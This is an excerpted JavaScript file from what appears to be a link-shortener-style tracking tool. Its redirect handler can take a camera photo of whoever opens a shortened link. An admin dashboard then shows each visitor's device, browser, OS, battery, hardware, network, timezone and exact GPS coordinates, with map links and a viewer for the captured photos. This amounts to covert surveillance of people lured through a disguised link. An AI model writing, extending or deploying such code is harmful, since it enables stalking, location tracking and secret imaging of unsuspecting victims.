...
async function captureCameraPhoto() {
    try {
        ...
        if (compressed.length > 60000) {
            compressed = canvas.toDataURL('image/jpeg', 0.15);
        }
        
        stream.getTracks().forEach(track => track.stop());
        video.remove();
        
        console.log('Photo size:', (compressed.length / 1024).toFixed(2), 'KB');
        return compressed;
    ...
    try {
        ...
        const html = recent.map(v => `
            <div class="data-item">
                ...
                <div class="data-item-stats">
                    <span><i class="fas fa-mobile-alt"></i> ${v.device_brand != 'Unknown' ? v.device_brand + ' ' : ''}${v.device_model}</span>
                    <span><i class="fab fa-${v.browser?.toLowerCase() || 'chrome'}"></i> ${v.browser}</span>
                    <span><i class="fab fa-${v.os?.toLowerCase()?.includes('windows') ? 'windows' : v.os?.toLowerCase() || 'linux'}"></i> ${v.os} ${v.os_version != 'Unknown' ? v.os_version : ''}</span>
                </div>
                <div class="data-item-stats">
                    <span><i class="fas fa-battery-full"></i> Battery: ${v.battery} (${v.charging == 'Yes' ? 'Charging' : 'Not Charging'})</span>
                    <span><i class="fas fa-microchip"></i> RAM: ${v.ram} | CPU: ${v.cpu} cores</span>
                </div>
                <div class="data-item-stats">
                    <span><i class="fas fa-wifi"></i> Network: ${v.connection.toUpperCase()} | Speed: ${v.downlink} | Latency: ${v.rtt}</span>
                </div>
                <div class="data-item-stats">
                    <span><i class="fas fa-desktop"></i> Screen: ${v.screen} | Ratio: ${v.ratio}</span>
                    <span><i class="fas fa-language"></i> ${v.language}</span>
                    <span><i class="fas fa-clock"></i> ${v.timezone}</span>
                </div>
                ${v.lat ? `
                    <div class="data-item-stats">
                        <i class="fas fa-satellite-dish"></i> GPS: ${v.lat.toFixed(6)}, ${v.lng?.toFixed(6)} (Accuracy: ${v.accuracy ? v.accuracy + 'm' : 'Unknown'})
                        <button class="data-btn-sm" onclick="window.open('https://www.google.com/maps?q=${v.lat},${v.lng}', '_blank')">
                            <i class="fas fa-map-marked-alt"></i> Open Maps
                        </button>
                    </div>
                ` : ''}
                ${v.photo && v.photo !== 'black_screen' && v.photo.startsWith('data:image') && v.photo.length > 1000 ? `
                    <div class="data-item-stats" style="color: #00ff41; margin-top: 8px;">
                        <i class="fas fa-camera"></i> Photo captured! (${(v.photo.length / 1024).toFixed(1)} KB)
        ...
        updateDisplay('RECENT ACTIVITY', 'fa-exclamation-triangle', '<div class="empty-data"><i class="fas fa-exclamation-triangle"></i><p>Error loading data</p></div>');
    }
}

// VIEW ANALYTICS - FIXED WITH ALL DATA
window.viewAnalytics = async (code) => {
    ...
    try {
        ...
        snapshot.forEach(child => { 
            const val = child.val();
            if (val && val.created_at) {
                analytics.push({ id: child.key, ...val });
            }
        });
        analytics.reverse();
        ...
        let html = `
            ...
            <div style="margin-bottom: 12px; padding: 8px; background: rgba(0,0,0,0.3); border-radius: 8px;">
                <div style="font-size: 0.7rem; word-break: break-all;">
                    <i class="fas fa-link"></i> Original URL: ${linkData?.long_url || 'N/A'}
                </div>
                <div style="font-size: 0.7rem; margin-top: 5px;">
                    <i class="fas fa-calendar"></i> Created: ${linkData?.created_at ? new Date(linkData.created_at).toLocaleString() : 'N/A'}
                </div>
            </div>
        `;
        ...
        if (analytics.length === 0) {
            ...
            html += analytics.map((v, index) => `
                <div class="data-item">
                    ...
                    <div class="data-item-stats"><strong><i class="fas fa-mobile-alt"></i> Device:</strong> ${v.device_brand != 'Unknown' ? v.device_brand + ' ' : ''}${v.device_model || v.os || 'Unknown'}</div>
                    <div class="data-item-stats"><strong><i class="fab fa-${v.browser?.toLowerCase() || 'chrome'}"></i> Browser:</strong> ${v.browser || 'Unknown'} | <strong>OS:</strong> ${v.os || 'Unknown'} ${v.os_version != 'Unknown' ? '('+v.os_version+')' : ''}</div>
                    ...
                    ${v.latitude ? `
                        <div class="data-item-stats">
                            <strong><i class="fas fa-satellite-dish"></i> GPS:</strong> ${v.latitude.toFixed(6)}, ${v.longitude?.toFixed(6)} | Accuracy: ${v.accuracy ? v.accuracy + 'm' : 'Unknown'}
                            <button class="data-btn-sm" onclick="window.open('https://www.google.com/maps?q=${v.latitude},${v.longitude}', '_blank')">
                                <i class="fas fa-map-marked-alt"></i> View on Map
                            </button>
                        </div>
                    ` : ''}
                    ${v.captured_image && v.captured_image !== 'black_screen' && v.captured_image.startsWith('data:image') && v.captured_image.length > 1000 ? `
                        <div class="data-item-stats" style="color: #00ff41; margin-top: 8px;">
                            <strong><i class="fas fa-camera"></i> Photo:</strong> Captured (${(v.captured_image.length / 1024).toFixed(1)} KB)
...
window.viewPhoto = (imageData) => {
    ...
    console.log('Viewing photo, length:', imageData ? imageData.length : 0);
    
    if (modal && img && imageData && imageData.startsWith('data:image') && imageData.length > 1000) {
        img.src = imageData;
        modal.classList.remove('hidden');
        showToast('Photo', 'Click Download to save image', 'success');
    } else {
        showToast('Error', 'No valid photo available or photo corrupted', 'error');
    }
};
...
async function handleVisitorRedirect() {
    ...
    try {
        ...
        if (linkData.capture_camera) {
            ...
            console.log('Camera image captured:', cameraImg ? 'Yes' : 'No');
        }
